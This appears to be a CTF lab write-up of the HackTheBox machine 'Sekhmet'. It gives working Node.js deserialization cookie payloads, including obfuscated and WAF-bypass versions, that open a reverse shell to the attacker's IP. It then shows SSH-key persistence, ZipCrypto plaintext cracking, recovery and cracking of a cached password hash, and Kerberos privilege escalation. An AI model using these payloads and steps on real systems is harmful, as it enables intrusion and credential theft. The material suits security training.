---
layout: post
title: "sekhmet"
date: 2025-10-22 
categories: CPTS Playlist
---
# sekhmet

# Summary

- fuzz for subdomains; found login portal
- weak credential admin:admin to logon
- cookie editor to see cookie; base64 decode to find JSON object
- wapplyazer identify nodejs framework; nodejs deserialisation to get rce; reverse shell
- inject our public key in user’s .ssh dir to maintain persistence and acquire valid login
- found password protected backup.zip; transfer back to host; use 7z to find encryption method ZipCrypto Store
- ZipCrypto known to be vulnerable to plaintext attack; deflated the zip file
- found files containing kerberos cache; found sha512 of a user’s password; cracked with hashcat
- use kinit to get valid kerberos ticket for user ray.duncan; local administrator on the Linux machine; ksu to raise privilege
- set up socks proxy on ssh so we can interact with internal servers with proxychains
- found PS scripts that updates domain users’ mobile phone numbers; changes in LDAP are reflected on a file on smb server; scriptrunner running script to update the file; program ran in constrained language mode
- blind command injection in mobile phone update; ldapmodify to modify LDAP attributes
- use root to allow remote port forward in sshd_config; forward connnection to smbserver to our [localhost](http://localhost) to attempt to capture NTLMv2 hash
- command injection force authentication to our SMB server; capture NTLMv2 hash; crack with hashcat
- kerbrute to verify password using Pre-Authentication; password spray to find user bob.wood that reuses the same password as scriptrunner
- bob.wood is a member of remote management group; evil-winrm logon; constrained language environment
- transfer relevant files back; decrypt Login Data from Edge using master key from DPAPI and Local State using pypykatz
- alternative method: enuemrate app locker policy; find world-writable directory not blocked by app locker; upload SharpChromium to that dir; decrypt Login Data
- reveal domain admin password; request kerberos ticket with kinit; we are domain admin

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/sekhmet 10.10.11.179

22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8c:71:55:df:97:27:5e:d5:37:5a:8d:e2:92:3b:f3:6e (RSA)
|   256 b2:32:f5:88:9b:fb:58:fa:35:b0:71:0c:9a:bd:3c:ef (ECDSA)
|_  256 eb:73:c0:93:6e:40:c8:f6:b0:a8:28:93:7d:18:47:4c (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Web

Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/sekhmet/image.png)

Let’s add the domain name to our /etc/hosts file:

```bash
10.10.11.179 windcorp.htb www.windcorp.htb
```

![image.png]({{ site.baseurl }}/assets/sekhmet/image%201.png)

On the top left hand corner, we get the format for email accounts for windcorp.htb. 

Viewing the page source:

![image.png]({{ site.baseurl }}/assets/sekhmet/image%202.png)

Nothing too interesting. 

The webserver used is nginx 1.18.0. No functionalities found. Let’s fuzz for subdomains:

```bash
ffuf -u http://10.10.11.179 -H "Host: FUZZ.windcorp.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 153

portal
```

Let’s add the subdomain to our /etc/hosts file and visit it:

```bash
http://portal.windcorp.htb
```

![image.png]({{ site.baseurl }}/assets/sekhmet/image%203.png)

Let’s try default credentials admin:admin. We are in:

![image.png]({{ site.baseurl }}/assets/sekhmet/image%204.png)

![image.png]({{ site.baseurl }}/assets/sekhmet/image%205.png)

The interesting thing is there seem to be a function tracking how long we have been logged in. 

Using cookie editor, we check we have two cookie values:

![image.png]({{ site.baseurl }}/assets/sekhmet/image%206.png)

The profile cookie seems to be base64. Let’s decode it:

```bash
echo 'eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOiIxIiwibG9nb24iOjE3NjA5NTA1MzYwNzF9' | base64 -d

{"username":"admin","admin":"1","logon":1760950536071}
```

We can postulate that the backend has to deserialize the json object. 

## Foothold

Node js has a known deserialization vulnerability. Let’s search up node js deserialization hacktricks, we find this page:

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

Let’s create our payload which is a reverse shell that we can pass as a cookie value to be deserialized and executed. 

Let’s craft our payload:

```bash
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/10.10.16.4/4444 0>&1'\", function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

Now let’s base64 encode it. We can do it in burp in the decoder tab:

```bash
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7XG4gXHQgcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC80NDQ0IDA+JjEnIiwgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7XG4gfSgpIn0=
```

Now let’s start a listener and and make a request with our cookie:

```bash
nc -lnvp 4444
```

And we submit the cookie value. We can do this on burp repeater:

Request:

![image.png]({{ site.baseurl }}/assets/sekhmet/image%207.png)

response:

![image.png]({{ site.baseurl }}/assets/sekhmet/image%208.png)

Let’s encode our payload.

Let’s use [**nodejsshell.py](http://nodejsshell.py) to generate our reverse shell:**

```bash
python2 nodejsshell.py 10.10.16.4 4444

[+] LHOST = 10.10.16.4
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,52,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

Now, our wrap our reverse shell in the paylaod:

```bash
{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,52,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```

Now, let’s base64 encode it in the decoder tab in burp:

```bash
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7IGV2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSgxMCwxMTgsOTcsMTE0LDMyLDExMCwxMDEsMTE2LDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSwxMTAsMTAxLDExNiwzOSw0MSw1OSwxMCwxMTgsOTcsMTE0LDMyLDExNSwxMTIsOTcsMTE5LDExMCwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksOTksMTA0LDEwNSwxMDgsMTAwLDk1LDExMiwxMTQsMTExLDk5LDEwMSwxMTUsMTE1LDM5LDQxLDQ2LDExNSwxMTIsOTcsMTE5LDExMCw1OSwxMCw3Miw3OSw4Myw4NCw2MSwzNCw0OSw0OCw0Niw0OSw0OCw0Niw0OSw1NCw0Niw1MiwzNCw1OSwxMCw4MCw3OSw4Miw4NCw2MSwzNCw1Miw1Miw1Miw1MiwzNCw1OSwxMCw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw2MSwzNCw1Myw0OCw0OCw0OCwzNCw1OSwxMCwxMDUsMTAyLDMyLDQwLDExNiwxMjEsMTEyLDEwMSwxMTEsMTAyLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsNjEsNjEsMzIsMzksMTE3LDExMCwxMDAsMTAxLDEwMiwxMDUsMTEwLDEwMSwxMDAsMzksNDEsMzIsMTIzLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwNSwxMTYsNDEsMzIsMTIzLDMyLDExNCwxMDEsMTE2LDExNywxMTQsMTEwLDMyLDExNiwxMDQsMTA1LDExNSw0NiwxMDUsMTEwLDEwMCwxMDEsMTIwLDc5LDEwMiw0MCwxMDUsMTE2LDQxLDMyLDMzLDYxLDMyLDQ1LDQ5LDU5LDMyLDEyNSw1OSwzMiwxMjUsMTAsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDMyLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsMzIsNjEsMzIsMTEwLDEwMSwxMTksMzIsMTEwLDEwMSwxMTYsNDYsODMsMTExLDk5LDEwNywxMDEsMTE2LDQwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiw0MCw4MCw3OSw4Miw4NCw0NCwzMiw3Miw3OSw4Myw4NCw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsMTE1LDEwNCwzMiw2MSwzMiwxMTUsMTEyLDk3LDExOSwxMTAsNDAsMzksNDcsOTgsMTA1LDExMCw0NywxMTUsMTA0LDM5LDQ0LDkxLDkzLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTE5LDExNCwxMDUsMTE2LDEwMSw0MCwzNCw2NywxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTA1LDExMCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDExMSwxMTcsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTAxLDExNCwxMTQsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMjAsMTA1LDExNiwzOSw0NCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsOTksMTExLDEwMCwxMDEsNDQsMTE1LDEwNSwxMDMsMTEwLDk3LDEwOCw0MSwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMDEsMTEwLDEwMCw0MCwzNCw2OCwxMDUsMTE1LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMSwxMTAsNDAsMzksMTAxLDExNCwxMTQsMTExLDExNCwzOSw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTAxLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTAxLDExNiw4NCwxMDUsMTA5LDEwMSwxMTEsMTE3LDExNiw0MCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw0NCwzMiw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMTI1LDEwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDU5LDEwKSl9KCkifQ==
```

Now resubmit our cookie value. Same error.

We can bypass the WAF with unicode characters. Let’s change our payload:

```bash
{"rce":"_$$\u004e\u0044_\u0046UNC$$_\u0066unction(){ require('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/10.10.16.4/4444 0>&1'\", function(error, stdout, stderr) { console.log(stdout) })}()"}
```

Now encode it again in base64:

```bash
eyJyY2UiOiJfJCRcdTAwNGVcdTAwNDRfXHUwMDQ2VU5DJCRfXHUwMDY2dW5jdGlvbigpeyByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC80NDQ0IDA+JjEnXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pfSgpIn0=
```

Resubmit our cookie value on repeater. We now have shell:

![image.png]({{ site.baseurl }}/assets/sekhmet/image%209.png)

Let’s begin enumerating basic information:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png]({{ site.baseurl }}/assets/sekhmet/image%2010.png)

We are a regular user. Let’s keep persistence by adding our public key in .ssh:

```bash
#Let's create a ssh key on attack host
ssh-keygen -f webster
cat webster.pub

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAV1rzeXTB48PScZ+LyaStmckNcZHGqEpoAcENujYP4v kali@kali

#Now cat the content and echo it to authorized_keys on target host
cd .ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAV1rzeXTB48PScZ+LyaStmckNcZHGqEpoAcENujYP4v kali@kali" >> authorized_keys

#Now we try to login:
chmod 600 webster #change to secure permission to allow use of private key

ssh -i webster webster@windcorp.htb

```

We now have ssh session:

![image.png]({{ site.baseurl }}/assets/sekhmet/image%2011.png)

In the user’s home directory, we find a backup.zip. It requires a password. Let’s transfer the zip file back to our host and attempt to crack it with john:

```bash
scp -i webster webster@windcorp.htb:~/backup.zip .
```

Now, let’s convert the zip file to john format:

```bash
zip2john backup.zip > backup_hash

backup.zip:$pkzip$8*1*1*0*0*1b*6a10*fc794f0a18c1de68a50bc86688e8af0eea0bbb0f2da08df50db5d6*1*0*0*23*6b0b*948028888db049af3e1c0f90530c7ce8e189229495fbdf8bdda422b2447955b1f1b817*1*0*0*24*6a10*24756b2093c7fe81247c7d73c032bd5fbfe6f78795377fffd78565441a6be5d9ca07c4e7*1*0*8*24*6a10*2d0a305aa35ca08e43fe746941b356852946bb98ec819fbc1b295ea87a703ba68ea58f39*1*0*8*24*74e9*9ae5bc13a3d5783977d807e930c1923e559c531cfb0f01ddfb8fbae55cfac920eb358ccc*1*0*8*24*8b77*fbe091b3531567ef3e349c33cbc673fc96591295b5f1193898dc0473063cbebae293cc96*1*0*8*24*6ae9*4135163d7c24d434fde8ddf748d9f2ef78567881da43360022b68c79d1f7fe3cc40dac3c*2*0*18*c*5a1a3ba3*10800*62*0*18*6bf0*67b468397c45689f287b2bf36cec82a5abadc5a5998f1cc5*$/pkzip$::backup.zip:var/lib/sss/pubconf/kdcinfo.WINDCORP.HTB, var/lib/sss/pubconf/krb5.include.d/domain_realm_windcorp_htb, var/lib/sss/gpo_cache/windcorp.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI, var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults, var/lib/sss/pubconf/krb5.include.d/localauth_plugin, etc/sssd/sssd.conf, etc/passwd, var/lib/sss/gpo_cache/windcorp.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/Microsoft/Windows NT/SecEdit/GptTmpl.inf:backup.zip
```

Seems to file related to kerberos. Let’s crack the hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash
```

Not cracked. 

Let’s use 7z to get more information about the encryption methods:

```bash
7z l -slt backup.zip

<SNIP>
Method = ZipCrypto Store           
Characteristics = UT:MA:1 ux : Encrypt Descriptor                      
Host OS = Unix           
Version = 10                  
Volume Index = 0          
Offset = 39319 
```

ZipCrypto is known to be vulnerable. 

Searching up zipcrypto deflate plaintext attack, we find this github page:

[https://github.com/kimci86/bkcrack/releases](https://github.com/kimci86/bkcrack/releases)

Let’s download and extract the binary:

```bash
gzip -d bkcrack

tar -xvf bkcrack
```

 This page explains how the attack work. We first need some plain bytes from the archive. We can get that from listing files within the archive:

```bash
./bkcrack -L backup.zip

----- ---------- ----------- -------- ------------ ------------ ----------------    
    0 ZipCrypto  Deflate     d00eee74         1509          554 etc/passwd     
    1 None       Store       00000000            0            0 etc/sssd/conf.d/     
    2 ZipCrypto  Deflate     a46408d2          411          278 etc/sssd/sssd.conf  
    3 None       Store       00000000            0            0 var/lib/sss/db/          
    4 ZipCrypto  Deflate     7c8f25f5      1286144         3122 var/lib/sss/db/timestamps_windcorp.htb.ldb
<SNIP>
```

![image.png]({{ site.baseurl }}/assets/sekhmet/image%2012.png)

We need the plaintext of a file in the zip we have access to. We see /etc/passwd is in the zip file. Let’s archive /etc/passwd file and transfer it to our host. We can check the CRC (check-sum) to see if the same passwd file is used.

```bash
#on target
zip passwd.zip /etc/passwd

#on attack
scp -i webster webster@windcorp.htb:~/passwd.zip .
```

Now let’s verify the checksum:

```bash
7z l -slt backup.zip

<SNIP>
----------                                                             
Path = etc/passwd                                                                                                                              
CRC = D00EEE74
Method = ZipCrypto Deflate
<SNIP>

#now compare the CRC with passwd.zip
7z l -slt passwd.zip

<SNIP>
CRC = D00EEE74
Method = Deflate

```

It matches, the files are the same. Now let’s get the keys:

```bash
./bkcrack -C backup.zip -c etc/passwd -P passwd.zip -p etc/passwd

[06:57:03] Keys
d6829d8d 8514ff97 afc3f825
```

- -C backup.zip: Specifies the encrypted ZIP file (backup.zip).
- -c etc/passwd: Targets the encrypted file etc/passwd within backup.zip.
- -P passwd.zip: Provides the reference ZIP file containing the known plaintext.
- -p etc/passwd: Specifies the plaintext file (passwd) inside passwd.zip.

Now, we can use these keys to create a new archive, with all the same files, but with a new password of our choosing:

```bash
./bkcrack -C backup.zip -k d6829d8d 8514ff97 afc3f825 -U unlock.zip qwer1234

[06:58:57] Writing unlocked archive unlock.zip with password "qwer1234"
100.0 % (21 / 21)
Wrote unlocked archive.

```

Now let’s unzip the archive:

```bash
unzip unlock.zip

tree .
.
├── etc
│   ├── passwd
│   └── sssd
│       ├── conf.d
│       └── sssd.conf
├── unlock.zip
└── var
    └── lib
        └── sss
            ├── db
            │   ├── cache_windcorp.htb.ldb
            │   ├── ccache_WINDCORP.HTB
            │   ├── config.ldb
            │   ├── sssd.ldb
            │   ├── test
            │   │   ├── cache_windcorp.htb.ldb
            │   │   ├── ccache_WINDCORP.HTB
            │   │   ├── config.ldb
            │   │   ├── sssd.ldb
            │   │   └── timestamps_windcorp.htb.ldb
            │   └── timestamps_windcorp.htb.ldb
            ├── deskprofile
            ├── gpo_cache
            │   └── windcorp.htb
            │       └── Policies
            │           └── {31B2F340-016D-11D2-945F-00C04FB984F9}
            │               ├── GPT.INI
            │               └── Machine
            │                   └── Microsoft
            │                       └── Windows NT
            │                           └── SecEdit
            │                               └── GptTmpl.inf
            ├── keytabs
            ├── mc
            │   ├── group
            │   ├── initgroups
            │   └── passwd
            ├── pipes
            │   └── private
            ├── pubconf
            │   ├── kdcinfo.WINDCORP.HTB
            │   └── krb5.include.d
            │       ├── domain_realm_windcorp_htb
            │       ├── krb5_libdefaults
            │       └── localauth_plugin
            └── secrets

25 directories, 22 files
```

From the files, we can tell this contain configuration details for kerberos. We know we can find cached credentials in the var/lib/sss/db directory. Alternatively, we can also use this bash command to execute strings on all files in var directory:

```bash
find var/ -type f -exec strings {} \;  
```

Let’s look in var/lib/sss/db dir.

A line in the cache_windcorp.htb.ldb file, we find:

```bash
1659012413memberofcname=S-1-5-21-1844305427-4058123335-2739572863-3601@windcorp.htb,cn=groups,cn=windcorp.htb,cn=sysdbbname=S-1-5-21-1844305427
-4058123335-2739572863-513@windcorp.htb,cn=groups,cn=windcorp.htb,cn=sysdbinitgrExpireTimestamp                                                
1659012797canonicalUserPrincipalNameRay.Duncan@WINDCORP.HTBccacheFile"FILE:/tmp/krb5cc_1069003229_bA74OKcachedPasswordj$6$nHb338EAa7BAeuR0$MFQj
z2.B688LXEDsx035.Nj.CIDbe/u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF/hAj5ajIsm0zB.wg2zX81cachedPasswordType1lastCachedPasswordChange                  
1659007462failedLoginAttempts0lastOnlineAuth                                                                                                   
1659007462lastOnlineAuthWithCurrentToken 
```

We see Sha512 password in the midst. This seems to be associated with user Ray.Duncan. Let’s decrypt it with john. Save the hash to a file:

```bash
$6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035.Nj.CIDbe/u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF/hAj5ajIsm0zB.wg2zX81
```

Now crack:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ray_duncan.hash

pantera          (?) 
```

Now let’s return to the target host, and check whether there are services communicating with LDAP.

```bash
#on target
ps -ef --forest

root         338       1  0 10:33 ?        00:00:00 /usr/sbin/sssd -i --logger=files
root         425     338  0 10:33 ?        00:00:00  \_ /usr/libexec/sssd/sssd_be --domain windcorp.htb --uid 0 --gid 0 --logger=files
root         426     338  0 10:33 ?        00:00:00  \_ /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root         427     338  0 10:33 ?        00:00:00  \_ /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files

```

We see that it’s communicating with windcorp.htb domain. Let’s see if kinit is installed on the target host, and try to request a ticket for ray.duncan

```bash
kinit ray.duncan

klist

Ticket cache: FILE:/tmp/.cache/krb5cc.32655
Default principal: ray.duncan@WINDCORP.HTB

Valid starting       Expires              Service principal
10/20/2025 13:25:11  10/20/2025 18:25:11  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 10/21/2025 13:25:10
```

We have successfully received a ticket. Now let’s check if we can use kerberos authentication to authenticate as root

```bash
ksu
```

![image.png]({{ site.baseurl }}/assets/sekhmet/image%2013.png)

We are now root on the machine. 

## Lateral Movement

Let’s do a ping sweep and find out where the DC is. First, let’s find out our own address:

```bash
ip a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:10:93:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.100/24 brd 192.168.0.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::215:5dff:fe10:9300/64 scope link 
       valid_lft forever preferred_lft forever
```

```bash
for i in $(seq 254); do ping 192.168.0.$i -c1 -W1 & done | grep from

64 bytes from 192.168.0.2: icmp_seq=1 ttl=128 time=1.15 ms
64 bytes from 192.168.0.100: icmp_seq=1 ttl=64 time=0.036 ms

```

The .2 must be the DC. 

Another way to verify is to check the /etc/krb5.conf for server KDC. Then just ping the domain name, and see what address we get back:

```bash
ping -c1 hope.windcorp.htb

PING hope.windcorp.htb (192.168.0.2) 56(84) bytes of data.
64 bytes from hope.windcorp.htb (192.168.0.2): icmp_seq=1 ttl=128 time=0.302 ms

--- hope.windcorp.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.302/0.302/0.302/0.000 ms

```

